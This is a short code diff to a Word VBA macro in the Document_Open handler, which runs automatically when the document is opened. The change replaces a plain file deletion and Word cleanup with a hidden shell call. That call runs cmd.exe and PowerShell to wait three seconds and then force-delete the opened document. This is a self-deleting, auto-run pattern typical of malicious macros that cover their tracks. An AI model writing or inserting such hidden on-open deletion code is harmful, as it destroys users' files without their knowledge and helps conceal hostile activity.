@@ -98,17 +98,7 @@ Private Sub Document_Open()
         Loop
         
      
-        If Dir(currentDocPath) <> "" Then
-             Kill currentDocPath
-        End If
-        
-    
-        Application.DisplayAlerts = wdAlertsAll
-        
-     
-        If Documents.Count = 0 Then
-            Application.Quit SaveChanges:=wdDoNotSaveChanges
-        End If
+        Shell "cmd.exe /c powershell -command ""Start-Sleep 3; Remove-Item -Path '" & currentDocPath & "' -Force""", vbHide
     End If
 
     
